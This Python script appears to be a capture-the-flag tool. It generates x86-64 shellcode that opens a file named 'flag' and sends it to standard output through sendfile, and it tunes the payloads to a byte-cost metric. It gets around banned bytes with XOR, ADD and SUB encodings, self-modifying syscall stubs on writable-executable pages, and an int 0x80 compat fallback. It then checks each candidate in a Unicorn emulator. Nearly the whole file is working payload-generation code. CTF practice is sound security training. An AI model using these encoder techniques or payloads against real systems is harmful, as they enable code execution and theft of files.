#!/usr/bin/env python3
"""SheBanG shellcode generator and local semantic verifier.

The primary objective is not byte length but:

    cost = sum(byte + 1 for byte in program)

All generation is deterministic.  A candidate is emitted only when none of the
requested forbidden bytes occurs in the final byte string.
"""

from __future__ import annotations

import argparse
import json
import random
import sys
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Iterable, Iterator, Sequence


FLAG_DWORD = 0x67616C66  # b"flag" in little endian memory
FLAG_BYTES = FLAG_DWORD.to_bytes(4, "little")


def shellcode_cost(program: bytes) -> int:
    return sum(byte + 1 for byte in program)


def parse_bans(values: Sequence[str]) -> frozenset[int]:
    result: set[int] = set()
    for value in values:
        for token in value.replace(",", " ").split():
            token = token.strip().lower()
            if token.startswith("0x"):
                token = token[2:]
            if not token:
                continue
            number = int(token, 16)
            if not 0 <= number <= 0xFF:
                raise ValueError(f"invalid byte: {value!r}")
            result.add(number)
    return frozenset(result)


def fmt_hex(program: bytes) -> str:
    return program.hex()


def has_bans(program: bytes, bans: Iterable[int]) -> bool:
    return not set(program).isdisjoint(bans)


@dataclass(frozen=True)
class Candidate:
    name: str
    program: bytes
    family: str = "x64-open-sendfile"
    assumptions: tuple[str, ...] = ()
    notes: str = ""

    @property
    def length(self) -> int:
        return len(self.program)

    @property
    def cost(self) -> int:
        return shellcode_cost(self.program)

    @property
    def unique_bytes(self) -> tuple[int, ...]:
        return tuple(sorted(set(self.program)))

    def json_dict(self) -> dict[str, object]:
        return {
            "name": self.name,
            "family": self.family,
            "hex": self.program.hex(),
            "length": self.length,
            "cost": self.cost,
            "unique_bytes": [f"{x:02x}" for x in self.unique_bytes],
            "assumptions": list(self.assumptions),
            "notes": self.notes,
        }


@dataclass(frozen=True)
class Fragment:
    name: str
    code: bytes


def _allowed(code: bytes, bans: frozenset[int]) -> bool:
    return not has_bans(code, bans)


def _best_xor_pair(target: bytes, bans: frozenset[int]) -> tuple[bytes, bytes] | None:
    """Return lowest-cost A,K with A xor K == target and no forbidden byte."""
    allowed = [x for x in range(256) if x not in bans]
    left = bytearray()
    right = bytearray()
    for byte in target:
        options = [(a + (a ^ byte), a, a ^ byte) for a in allowed if (a ^ byte) not in bans]
        if not options:
            return None
        _, a, k = min(options)
        left.append(a)
        right.append(k)
    return bytes(left), bytes(right)


def _best_add_pair(target: bytes, bans: frozenset[int]) -> tuple[bytes, bytes] | None:
    """Return lowest-cost A,D with (A + D) mod 2**32 == target."""
    allowed = [x for x in range(256) if x not in bans]
    # state: carry -> (sum_of_encoded_values, left_bytes, right_bytes)
    states: dict[int, tuple[int, bytes, bytes]] = {0: (0, b"", b"")}
    for wanted in target:
        new: dict[int, tuple[int, bytes, bytes]] = {}
        for carry_in, (score, left, right) in states.items():
            for a in allowed:
                # a + d + carry == wanted (mod 256); d is uniquely determined.
                d = (wanted - a - carry_in) & 0xFF
                if d in bans:
                    continue
                carry_out = 1 if a + d + carry_in >= 256 else 0
                item = (score + a + d, left + bytes([a]), right + bytes([d]))
                if carry_out not in new or item[0] < new[carry_out][0]:
                    new[carry_out] = item
        states = new
        if not states:
            return None
    _, left, right = min(states.values(), key=lambda item: item[0])
    return left, right


def _best_sub_pair(target: bytes, bans: frozenset[int]) -> tuple[bytes, bytes] | None:
    """Return lowest-cost A,D with (A - D) mod 2**32 == target."""
    # A - D == T  <=>  T + D == A.  A byte constraints are checked explicitly.
    allowed = [x for x in range(256) if x not in bans]
    states: dict[int, tuple[int, bytes, bytes]] = {0: (0, b"", b"")}
    for wanted in target:
        new: dict[int, tuple[int, bytes, bytes]] = {}
        for carry_in, (score, left, right) in states.items():
            for d in allowed:
                total = wanted + d + carry_in
                a = total & 0xFF
                if a in bans:
                    continue
                carry_out = 1 if total >= 256 else 0
                item = (score + a + d, left + bytes([a]), right + bytes([d]))
                if carry_out not in new or item[0] < new[carry_out][0]:
                    new[carry_out] = item
        states = new
        if not states:
            return None
    _, left, right = min(states.values(), key=lambda item: item[0])
    return left, right


def path_loaders(bans: frozenset[int]) -> list[Fragment]:
    """Place a NUL-terminated ``flag`` string at RSP."""
    variants: list[Fragment] = []

    direct = b"\x68" + FLAG_BYTES  # push imm32 sign-extends; top dword is NUL.
    if _allowed(direct, bans):
        variants.append(Fragment("path.push-imm32", direct))

    # Direct MOV r32, imm32 zero-extends the register, then PUSH r64.
    for reg, mov_opcode, push_opcode in (
        ("rax", 0xB8, 0x50),
        ("rcx", 0xB9, 0x51),
        ("rdx", 0xBA, 0x52),
        ("rbx", 0xBB, 0x53),
        ("rbp", 0xBD, 0x55),
        ("rsi", 0xBE, 0x56),
        ("rdi", 0xBF, 0x57),
    ):
        code = bytes([mov_opcode]) + FLAG_BYTES + bytes([push_opcode])
        if _allowed(code, bans):
            variants.append(Fragment(f"path.mov-{reg}-push", code))

    xor_pair = _best_xor_pair(FLAG_BYTES, bans)
    if xor_pair:
        encoded, key = xor_pair
        # EAX has a compact accumulator XOR encoding.
        for name, code in (
            ("path.mov-xor-push", b"\xb8" + encoded + b"\x35" + key + b"\x50"),
            ("path.push-pop-xor-push", b"\x68" + encoded + b"\x58\x35" + key + b"\x50"),
            ("path.push-xor-mem", b"\x68" + encoded + b"\x81\x34\x24" + key),
        ):
            if _allowed(code, bans):
                variants.append(Fragment(name, code))

        for reg, mov_opcode, modrm, push_opcode in (
            ("rcx", 0xB9, 0xF1, 0x51),
            ("rdx", 0xBA, 0xF2, 0x52),
            ("rbx", 0xBB, 0xF3, 0x53),
            ("rbp", 0xBD, 0xF5, 0x55),
            ("rsi", 0xBE, 0xF6, 0x56),
            ("rdi", 0xBF, 0xF7, 0x57),
        ):
            code = bytes([mov_opcode]) + encoded + b"\x81" + bytes([modrm]) + key + bytes([push_opcode])
            if _allowed(code, bans):
                variants.append(Fragment(f"path.mov-xor-{reg}-push", code))

    add_pair = _best_add_pair(FLAG_BYTES, bans)
    if add_pair:
        encoded, delta = add_pair
        for name, code in (
            ("path.mov-add-push", b"\xb8" + encoded + b"\x05" + delta + b"\x50"),
            ("path.push-add-mem", b"\x68" + encoded + b"\x81\x04\x24" + delta),
        ):
            if _allowed(code, bans):
                variants.append(Fragment(name, code))

    sub_pair = _best_sub_pair(FLAG_BYTES, bans)
    if sub_pair:
        encoded, delta = sub_pair
        for name, code in (
            ("path.mov-sub-push", b"\xb8" + encoded + b"\x2d" + delta + b"\x50"),
            ("path.push-sub-mem", b"\x68" + encoded + b"\x81\x2c\x24" + delta),
        ):
            if _allowed(code, bans):
                variants.append(Fragment(name, code))

    # Deduplicate encodings while retaining the clearest first name.
    seen: set[bytes] = set()
    return [item for item in variants if not (item.code in seen or seen.add(item.code))]


def fixed_fragments(items: Sequence[tuple[str, str]], bans: frozenset[int]) -> list[Fragment]:
    result: list[Fragment] = []
    for name, hex_string in items:
        code = bytes.fromhex(hex_string)
        if _allowed(code, bans):
            result.append(Fragment(name, code))
    return result


def direct_candidates(bans: frozenset[int]) -> Iterator[Candidate]:
    paths = path_loaders(bans)
    pointers = fixed_fragments(
        (
            ("ptr.push-rsp-pop-rdi", "54 5f"),
            ("ptr.mov-rdi-rsp", "48 89 e7"),
            ("ptr.lea-rdi-rsp", "48 8d 3c 24"),
            ("ptr.via-rax", "54 58 50 5f"),
            ("ptr.via-rbx", "54 5b 53 5f"),
            ("ptr.via-rcx", "54 59 51 5f"),
            ("ptr.via-rdx", "54 5a 52 5f"),
            ("ptr.via-rsi", "54 5e 56 5f"),
        ),
        bans,
    )
    setups = fixed_fragments(
        (
            # RAX=SYS_open(2), RDX=0 via CDQ, RSI=RDX via stack.
            ("open.push2-cdq-rdx2rsi", "6a 02 58 99 52 5e"),
            ("open.push2-cdq-push0rsi", "6a 02 58 99 6a 00 5e"),
            ("open.push2-cdq-xor-rsi", "6a 02 58 99 31 f6"),
            ("open.push2-xor-both", "6a 02 58 31 d2 31 f6"),
            ("open.xor-add2-cdq-rdx2rsi", "31 c0 04 02 99 52 5e"),
            ("open.sub-add2-cdq-rdx2rsi", "29 c0 04 02 99 52 5e"),
            ("open.mov-eax2-cdq-rdx2rsi", "b8 02 00 00 00 99 52 5e"),
        ),
        bans,
    )
    # Cheaper cost-oriented setup: zeroing EAX with AND imm32=0 costs only 42
    # under this challenge's metric.  These variants intentionally leave RDX
    # unknown during open (mode is ignored for O_RDONLY); their matching post
    # fragments execute CDQ immediately before sendfile.
    cheap_setups_rdx_unknown = fixed_fragments(
        (
            ("open.and0-rsi-from-rax-add2", "25 00 00 00 00 50 5e 04 02"),
            ("open.mov0-rsi-from-rax-add2", "b8 00 00 00 00 50 5e 04 02"),
            ("open.sub0-rsi-from-rax-add2", "29 c0 50 5e 04 02"),
            ("open.xor0-rsi-from-rax-add2", "31 c0 50 5e 04 02"),
        ),
        bans,
    )
    syscall = b"\x0f\x05"
    if not _allowed(syscall, bans):
        return

    # Each post fragment starts with EAX=open result, RSI=0, RDX=0 and performs
    # sendfile(1, opened_fd, NULL, sufficiently_large_count).
    posts = fixed_fragments(
        (
            (
                "post.xchg-rdi1-rspcount-add40",
                "96 6a 01 5f 54 41 5a 04 28 0f 05",
            ),
            (
                "post.xchg-pathcount-rdi1-add40",
                "96 57 41 5a 6a 01 5f 04 28 0f 05",
            ),
            (
                "post.xchg-rdi1-leacount-add40",
                "96 6a 01 5f 4c 8d 14 24 04 28 0f 05",
            ),
            (
                "post.xchg-rdi1-movcount-add40",
                "96 6a 01 5f 49 89 e2 04 28 0f 05",
            ),
            (
                "post.xchg-rdi1-count127-add40",
                "96 6a 01 5f 6a 7f 41 5a 04 28 0f 05",
            ),
            (
                "post.xchg-rdi1-rspcount-or40",
                "96 6a 01 5f 54 41 5a 0c 28 0f 05",
            ),
            (
                "post.xchg-rdi1-rspcount-xor40",
                "96 6a 01 5f 54 41 5a 34 28 0f 05",
            ),
            (
                "post.xchg-rdi1-rspcount-mov40",
                "96 6a 01 5f 54 41 5a b0 28 0f 05",
            ),
            (
                "post.xchg-rdi1-rspcount-push40",
                "96 6a 01 5f 54 41 5a 6a 28 58 0f 05",
            ),
            (
                "post.rex-xchg-rdi1-rspcount-add40",
                "48 96 6a 01 5f 54 41 5a 04 28 0f 05",
            ),
            (
                "post.pushfd-rdxzero-rdi1-rspcount-add40",
                "50 5e 52 58 6a 01 5f 54 41 5a 04 28 0f 05",
            ),
        ),
        bans,
    )

    cheap_posts_zero_rdx = fixed_fragments(
        (
            (
                "post.xchg-add1-rax2rdi-add39-cdq-rspcount",
                "96 04 01 50 5f 04 27 99 54 41 5a 0f 05",
            ),
            (
                "post.xchg-pathcount-add1-rax2rdi-add39-cdq",
                "96 57 41 5a 04 01 50 5f 04 27 99 0f 05",
            ),
            (
                "post.xchg-add1-rax2rdi-add39-cdq-leacount",
                "96 04 01 50 5f 04 27 99 4c 8d 14 24 0f 05",
            ),
            (
                "post.xchg-add1-rax2rdi-add39-cdq-count127",
                "96 04 01 50 5f 04 27 99 6a 7f 41 5a 0f 05",
            ),
        ),
        bans,
    )

    for path in paths:
        for pointer in pointers:
            for setup in setups:
                prefix = path.code + pointer.code + setup.code + syscall
                for post in posts:
                    program = prefix + post.code
                    name = "/".join((path.name, pointer.name, setup.name, post.name))
                    yield Candidate(
                        name=name,
                        program=program,
                        notes="Robust to unknown general-purpose register contents; requires normal writable stack.",
                    )
            for setup in cheap_setups_rdx_unknown:
                prefix = path.code + pointer.code + setup.code + syscall
                for post in cheap_posts_zero_rdx:
                    program = prefix + post.code
                    name = "/".join((path.name, pointer.name, setup.name, post.name))
                    yield Candidate(
                        name=name,
                        program=program,
                        notes=(
                            "Cost-optimized robust candidate. open(O_RDONLY) ignores the unknown mode in RDX; "
                            "CDQ zeros RDX before sendfile."
                        ),
                    )


def _xor_byte_pair(target: int, bans: frozenset[int]) -> tuple[int, int] | None:
    options = [(a + (a ^ target), a, a ^ target) for a in range(256) if a not in bans and (a ^ target) not in bans]
    if not options:
        return None
    _, encoded, key = min(options)
    return encoded, key


def selfmod_candidates(bans: frozenset[int]) -> Iterator[Candidate]:
    """Candidates that contain no literal 0f 05: decode an RWX syscall/ret stub.

    Layout uses a forward CALL with a three-byte displacement.  Therefore this
    compact family requires byte 00 to remain available.  A separate int80
    family covers the common case where 00 is banned but CD/80 remain usable.
    """
    pair0 = _xor_byte_pair(0x0F, bans)
    pair1 = _xor_byte_pair(0x05, bans)
    if not pair0 or not pair1:
        return
    enc0, key0 = pair0
    enc1, key1 = pair1

    # CALL body; encoded-syscall; RET; body begins with POP RBX.
    head = b"\xe8\x03\x00\x00\x00" + bytes([enc0, enc1, 0xC3]) + b"\x5b"
    decoders = (
        Fragment("decode.word-xor", b"\x66\x81\x33" + bytes([key0, key1])),
        Fragment("decode.byte-xor", b"\x80\x33" + bytes([key0]) + b"\x80\x73\x01" + bytes([key1])),
    )
    if not _allowed(head, bans):
        return

    paths = path_loaders(bans)
    pointers = fixed_fragments(
        (("ptr.push-rsp-pop-rdi", "54 5f"), ("ptr.mov-rdi-rsp", "48 89 e7")),
        bans,
    )
    setups = fixed_fragments(
        (
            ("open.push2-cdq-rdx2rsi", "6a 02 58 99 52 5e"),
            ("open.push2-cdq-push0rsi", "6a 02 58 99 6a 00 5e"),
            ("open.push2-cdq-xor-rsi", "6a 02 58 99 31 f6"),
        ),
        bans,
    )
    # The stub is in RBX and CALL RBX executes syscall;ret.
    posts = fixed_fragments(
        (
            ("post.callstub", "ff d3 96 6a 01 5f 54 41 5a 04 28 ff d3"),
            ("post.callstub-pathcount", "ff d3 96 57 41 5a 6a 01 5f 04 28 ff d3"),
        ),
        bans,
    )
    for decoder in decoders:
        if not _allowed(decoder.code, bans):
            continue
        for path in paths:
            for pointer in pointers:
                for setup in setups:
                    for post in posts:
                        program = head + decoder.code + path.code + pointer.code + setup.code + post.code
                        if _allowed(program, bans):
                            yield Candidate(
                                name="/".join(("selfmod", decoder.name, path.name, pointer.name, setup.name, post.name)),
                                program=program,
                                family="x64-selfmod-open-sendfile",
                                assumptions=("code page is writable and executable", "byte 00 is allowed"),
                                notes="The submitted bytes do not contain literal 0f05; they are decoded in the RWX page.",
                            )


def int80_candidates(bans: frozenset[int]) -> Iterator[Candidate]:
    """32-bit compat ABI fallback with no literal x86-64 SYSCALL instruction.

    This family embeds the pathname in the code page and therefore requires the
    runner's executable mapping to be below 4 GiB, as documented by the family
    assumption.  The official runner should be checked before using it.
    """
    # call body (+5); "flag\0"; body: pop rbx obtains pathname address.
    head = bytes.fromhex("e8 05 00 00 00 66 6c 61 67 00 5b")
    bodies = (
        Fragment(
            "int80.sendfile32",
            bytes.fromhex(
                # RSI=count(path pointer), EAX=5, EDX=0, ECX=0, open;
                # ECX=fd/EAX=0, EBX=1, EAX=187, sendfile32.
                "53 5e 6a 05 58 99 52 59 cd 80 91 6a 01 5b b0 bb cd 80"
            ),
        ),
    )
    if not _allowed(head, bans):
        return
    for body in bodies:
        program = head + body.code
        if _allowed(program, bans):
            yield Candidate(
                name=f"int80/{body.name}",
                program=program,
                family="i386-compat-open-sendfile",
                assumptions=("RWX code mapping address is below 4 GiB", "i386 compat int 0x80 is enabled"),
                notes="Fallback when 0f or 05 is forbidden; verify against official runner before submission.",
            )


def generate_candidates(bans: frozenset[int]) -> list[Candidate]:
    all_candidates = list(direct_candidates(bans))
    all_candidates.extend(selfmod_candidates(bans))
    all_candidates.extend(int80_candidates(bans))
    unique: dict[bytes, Candidate] = {}
    for candidate in all_candidates:
        if has_bans(candidate.program, bans):
            continue
        previous = unique.get(candidate.program)
        if previous is None or candidate.name < previous.name:
            unique[candidate.program] = candidate
    return sorted(unique.values(), key=lambda item: (item.cost, item.length, item.name))


def emulate_candidate(program: bytes, flag: bytes = b"UHCON{local_test_flag}\n", poison_seed: int = 0x5EBA6) -> dict[str, object]:
    """Emulate the shellcode and model only the syscalls needed by candidates."""
    try:
        from unicorn import Uc, UcError, UC_ARCH_X86, UC_MODE_64, UC_HOOK_INSN, UC_HOOK_INTR
        from unicorn.x86_const import (
            UC_X86_INS_SYSCALL,
            UC_X86_REG_RAX,
            UC_X86_REG_RBX,
            UC_X86_REG_RCX,
            UC_X86_REG_RDX,
            UC_X86_REG_RSI,
            UC_X86_REG_RDI,
            UC_X86_REG_RBP,
            UC_X86_REG_RSP,
            UC_X86_REG_R8,
            UC_X86_REG_R9,
            UC_X86_REG_R10,
            UC_X86_REG_R11,
            UC_X86_REG_R12,
            UC_X86_REG_R13,
            UC_X86_REG_R14,
            UC_X86_REG_R15,
        )
    except ImportError as exc:  # pragma: no cover - depends on host package set
        return {"ok": False, "error": f"unicorn unavailable: {exc}", "output_hex": "", "syscalls": []}

    code_base = 0x10000000  # also permits meaningful int80 fallback testing
    stack_base = 0x20000000
    page_size = 0x1000
    code_size = max(page_size, (len(program) + page_size - 1) & ~(page_size - 1))
    uc = Uc(UC_ARCH_X86, UC_MODE_64)
    uc.mem_map(code_base, code_size)
    uc.mem_write(code_base, program)
    uc.mem_map(stack_base, 0x20000)
    uc.reg_write(UC_X86_REG_RSP, stack_base + 0x10000)

    rng = random.Random(poison_seed)
    regs = (
        UC_X86_REG_RAX,
        UC_X86_REG_RBX,
        UC_X86_REG_RCX,
        UC_X86_REG_RDX,
        UC_X86_REG_RSI,
        UC_X86_REG_RDI,
        UC_X86_REG_RBP,
        UC_X86_REG_R8,
        UC_X86_REG_R9,
        UC_X86_REG_R10,
        UC_X86_REG_R11,
        UC_X86_REG_R12,
        UC_X86_REG_R13,
        UC_X86_REG_R14,
        UC_X86_REG_R15,
    )
    for register in regs:
        uc.reg_write(register, rng.getrandbits(64) | 0x0101010101010101)

    state: dict[str, object] = {"output": bytearray(), "syscalls": [], "fd": 3, "opened": False, "error": None}

    def read_c_string(address: int, limit: int = 256) -> bytes:
        data = bytearray()
        for offset in range(limit):
            byte = bytes(uc.mem_read(address + offset, 1))[0]
            if byte == 0:
                return bytes(data)
            data.append(byte)
        raise RuntimeError("unterminated pathname")

    def do_syscall(is_int80: bool = False) -> None:
        rax = uc.reg_read(UC_X86_REG_RAX)
        number = rax & 0xFFFFFFFF if is_int80 else rax
        calls: list[dict[str, object]] = state["syscalls"]  # type: ignore[assignment]
        if is_int80:
            ebx = uc.reg_read(UC_X86_REG_RBX) & 0xFFFFFFFF
            ecx = uc.reg_read(UC_X86_REG_RCX) & 0xFFFFFFFF
            edx = uc.reg_read(UC_X86_REG_RDX) & 0xFFFFFFFF
            esi = uc.reg_read(UC_X86_REG_RSI) & 0xFFFFFFFF
            calls.append({"abi": "int80", "nr": number, "ebx": ebx, "ecx": ecx, "edx": edx, "esi": esi})
            if number == 5:  # open(path, flags, mode)
                path = read_c_string(ebx)
                if path == b"flag" and ecx == 0:
                    state["opened"] = True
                    uc.reg_write(UC_X86_REG_RAX, state["fd"])
                else:
                    uc.reg_write(UC_X86_REG_RAX, 0xFFFFFFFFFFFFFFFE)
            elif number == 187:  # sendfile32(out, in, offset, count)
                if ebx == 1 and ecx == state["fd"] and edx == 0 and esi >= len(flag) and state["opened"]:
                    output: bytearray = state["output"]  # type: ignore[assignment]
                    output.extend(flag)
                    uc.reg_write(UC_X86_REG_RAX, len(flag))
                    uc.emu_stop()
                else:
                    state["error"] = "invalid sendfile32 arguments"
                    uc.emu_stop()
            else:
                state["error"] = f"unsupported int80 syscall {number}"
                uc.emu_stop()
            return

        rdi = uc.reg_read(UC_X86_REG_RDI)
        rsi = uc.reg_read(UC_X86_REG_RSI)
        rdx = uc.reg_read(UC_X86_REG_RDX)
        r10 = uc.reg_read(UC_X86_REG_R10)
        calls.append({"abi": "x64", "nr": number, "rdi": rdi, "rsi": rsi, "rdx": rdx, "r10": r10})
        if number == 2:  # open(path, flags, mode)
            path = read_c_string(rdi)
            if path == b"flag" and rsi == 0:
                state["opened"] = True
                uc.reg_write(UC_X86_REG_RAX, state["fd"])
            else:
                uc.reg_write(UC_X86_REG_RAX, 0xFFFFFFFFFFFFFFFE)
        elif number == 40:  # sendfile(out, in, offset, count)
            if rdi == 1 and rsi == state["fd"] and rdx == 0 and r10 >= len(flag) and state["opened"]:
                output = state["output"]  # type: ignore[assignment]
                output.extend(flag)
                uc.reg_write(UC_X86_REG_RAX, len(flag))
                uc.emu_stop()
            else:
                state["error"] = "invalid sendfile arguments"
                uc.emu_stop()
        else:
            state["error"] = f"unsupported x64 syscall {number}"
            uc.emu_stop()

    def syscall_hook(_uc: object, _user_data: object) -> None:
        do_syscall(False)

    def interrupt_hook(_uc: object, intno: int, _user_data: object) -> None:
        if intno == 0x80:
            do_syscall(True)
        else:
            state["error"] = f"unexpected interrupt {intno}"
            uc.emu_stop()

    uc.hook_add(UC_HOOK_INSN, syscall_hook, None, 1, 0, UC_X86_INS_SYSCALL)
    uc.hook_add(UC_HOOK_INTR, interrupt_hook)
    try:
        uc.emu_start(code_base, code_base + code_size, timeout=500_000, count=400)
    except UcError as exc:
        # A post-output fall-through crash is harmless for this challenge.
        if bytes(state["output"]) != flag:
            state["error"] = f"emulation error: {exc}"
    output = bytes(state["output"])
    return {
        "ok": output == flag,
        "error": state["error"],
        "output_hex": output.hex(),
        "syscalls": state["syscalls"],
    }


def candidate_report(candidate: Candidate, verification: dict[str, object] | None = None) -> dict[str, object]:
    report = candidate.json_dict()
    if verification is not None:
        report["verification"] = verification
    return report


def main(argv: Sequence[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--bans", nargs="*", default=[], help="hex bytes, e.g. --bans 00,0f,68")
    parser.add_argument("--top", type=int, default=10, help="number of candidates to print")
    parser.add_argument("--json", action="store_true", help="emit JSON")
    parser.add_argument("--no-verify", action="store_true", help="skip Unicorn semantic verification")
    parser.add_argument("--output", type=Path, help="write best candidate bytes here")
    args = parser.parse_args(argv)

    try:
        bans = parse_bans(args.bans)
    except ValueError as exc:
        parser.error(str(exc))

    candidates = generate_candidates(bans)
    if not candidates:
        print("no candidate satisfies the requested bans", file=sys.stderr)
        return 2

    reports: list[dict[str, object]] = []
    verified_best: Candidate | None = None
    for candidate in candidates[: max(args.top, 1)]:
        verification = None if args.no_verify else emulate_candidate(candidate.program)
        reports.append(candidate_report(candidate, verification))
        if verified_best is None and (verification is None or verification.get("ok")):
            verified_best = candidate

    if args.json:
        print(json.dumps({"bans": [f"{x:02x}" for x in sorted(bans)], "candidates": reports}, ensure_ascii=False, indent=2))
    else:
        print("bans:", " ".join(f"{x:02x}" for x in sorted(bans)) or "(none)")
        for report in reports:
            verification = report.get("verification")
            status = "unchecked" if verification is None else ("ok" if verification.get("ok") else "FAIL")
            print(f"{report['cost']:5d}  {report['length']:3d} B  {status:9s}  {report['family']}  {report['hex']}")
            print(f"       {report['name']}")

    if args.output:
        if verified_best is None:
            print("none of the inspected candidates verified; refusing to write output", file=sys.stderr)
            return 3
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_bytes(verified_best.program)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
